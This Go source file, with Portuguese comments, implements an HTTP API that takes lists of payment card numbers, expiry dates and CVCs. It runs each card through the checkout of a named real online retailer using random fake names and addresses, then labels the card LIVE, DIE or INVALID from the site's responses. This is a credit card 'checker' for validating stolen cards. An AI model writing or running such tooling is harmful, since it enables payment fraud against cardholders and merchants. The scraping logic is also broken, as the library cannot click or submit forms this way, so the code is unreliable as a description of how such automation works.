package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"strings"
	"time"

	"github.com/gocolly/colly"
	"github.com/gorilla/mux"
	"github.com/rs/cors"
	"math/rand"
)

type CardInfo struct {
	CC []string `json:"cc"`
}

type CardResult struct {
	Status  string `json:"status"`
	Message string `json:"message"`
}

func main() {
	r := mux.NewRouter()
	r.HandleFunc("/api/check-card", checkCardHandler).Methods(http.MethodPost)

	// Configurando o CORS para permitir todas as origens
	c := cors.New(cors.Options{
		AllowedOrigins:   []string{"*"},
		AllowedMethods:   []string{http.MethodGet, http.MethodPost, http.MethodOptions},
		AllowedHeaders:   []string{"*"},
		AllowCredentials: true,
	})

	handler := c.Handler(r)

	port := 8080
	fmt.Printf("API rodando em http://localhost:%d\n", port)
	log.Fatal(http.ListenAndServe(fmt.Sprintf(":%d", port), handler))
}

func checkCardHandler(w http.ResponseWriter, r *http.Request) {
	var cardInfo CardInfo
	if err := json.NewDecoder(r.Body).Decode(&cardInfo); err != nil {
		http.Error(w, "O parâmetro obrigatório não foi inserido", http.StatusBadRequest)
		return
	}

	if len(cardInfo.CC) == 0 {
		http.Error(w, "O parâmetro obrigatório não foi inserido", http.StatusBadRequest)
		return
	}

	results := make([]CardResult, 0, len(cardInfo.CC))

	for _, card := range cardInfo.CC {
		result := cardTesting(card)
		results = append(results, result)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(results)
}

func cardTesting(cardInfo string) CardResult {
	card := strings.Split(cardInfo, "|")

	// Configurando o collector do Colly para realizar a automação de forma similar ao Selenium
	c := colly.NewCollector(
		colly.AllowedDomains("www.woolovers.us"),
		colly.MaxDepth(2),
	)

	c.OnHTML("#onetrust-accept-btn-handler", func(e *colly.HTMLElement) {
		e.Click()
	})

	c.OnHTML(".btn.form-submit.btn-primary.btn-checkout.js-checkout", func(e *colly.HTMLElement) {
		e.Request.Visit(e.Attr("href"))
	})

	c.OnHTML("#RegisterEmailAddress", func(e *colly.HTMLElement) {
		e.DOM.SetAttr("value", getRandomLetters(10)+"@hotmail.com")
	})

	c.OnHTML("#saveAddress input", func(e *colly.HTMLElement) {
		switch e.Attr("name") {
		case "firstName":
			e.DOM.SetAttr("value", getRandomLetters(8))
		case "lastName":
			e.DOM.SetAttr("value", getRandomLetters(8))
		case "postcode":
			e.DOM.SetAttr("value", "202"+getRandomNumbers(6))
		case "address1":
			e.DOM.SetAttr("value", "123 Main Street")
		case "city":
			e.DOM.SetAttr("value", "Houston")
		case "region":
			e.DOM.SetAttr("value", "Texas")
		case "zipcode":
			e.DOM.SetAttr("value", "77002")
		}
	})

	c.OnHTML("#adyen-encrypted-form-number", func(e *colly.HTMLElement) {
		e.DOM.SetAttr("value", card[0])
	})

	c.OnHTML("#adyen-encrypted-form-expiry-month", func(e *colly.HTMLElement) {
		e.DOM.SetAttr("value", card[1])
	})

	c.OnHTML("#adyen-encrypted-form-expiry-year", func(e *colly.HTMLElement) {
		e.DOM.SetAttr("value", card[2])
	})

	c.OnHTML("#adyen-encrypted-form-cvc", func(e *colly.HTMLElement) {
		e.DOM.SetAttr("value", card[3])
	})

	c.OnHTML("#adyen-encrypted-form-holder-name", func(e *colly.HTMLElement) {
		e.DOM.SetAttr("value", "Joseph Alex")
	})

	// Simulação do processo de checkout, que substitui a parte Selenium por requests usando Colly
	var result CardResult
	c.OnResponse(func(r *colly.Response) {
		if strings.Contains(string(r.Body), "Please enter a valid card number") {
			result = CardResult{Status: "INVALID", Message: fmt.Sprintf("%s [Insira um número de cartão válido]", cardInfo)}
		} else if strings.Contains(string(r.Body), "Please enter a valid expiry date") {
			result = CardResult{Status: "INVALID", Message: fmt.Sprintf("%s [Insira um ano de expiração válido]", cardInfo)}
		} else if strings.Contains(string(r.Body), "Transaction Successful") {
			result = CardResult{Status: "LIVE", Message: fmt.Sprintf("%s [Transaction Successful]", cardInfo)}
		} else if strings.Contains(string(r.Body), "Not enough balance") {
			result = CardResult{Status: "LIVE", Message: fmt.Sprintf("%s [Not enough balance]", cardInfo)}
		} else if strings.Contains(string(r.Body), "CVC Declined") {
			result = CardResult{Status: "LIVE", Message: fmt.Sprintf("%s [CVC Declined]", cardInfo)}
		} else {
			result = CardResult{Status: "DIE", Message: fmt.Sprintf("%s [Unknown Error]", cardInfo)}
		}
	})

	err := c.Visit("https://www.woolovers.us/product/AddYouMayAlsoLikeProduct?productId=26807")
	if err != nil {
		log.Printf("Erro ao processar: %s", err)
		result = CardResult{Status: "ERROR", Message: err.Error()}
	}

	return result
}

func getRandomLetters(length int) string {
	letters := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
	result := make([]byte, length)
	for i := range result {
		result[i] = letters[randInt(len(letters))]
	}
	return string(result)
}

func getRandomNumbers(length int) string {
	numbers := "1234567890"
	result := make([]byte, length)
	for i := range result {
		result[i] = numbers[randInt(len(numbers))]
	}
	return string(result)
}

func randInt(n int) int {
	source := rand.NewSource(time.Now().UnixNano())
	randGen := rand.New(source)
	return randGen.Intn(n);
}
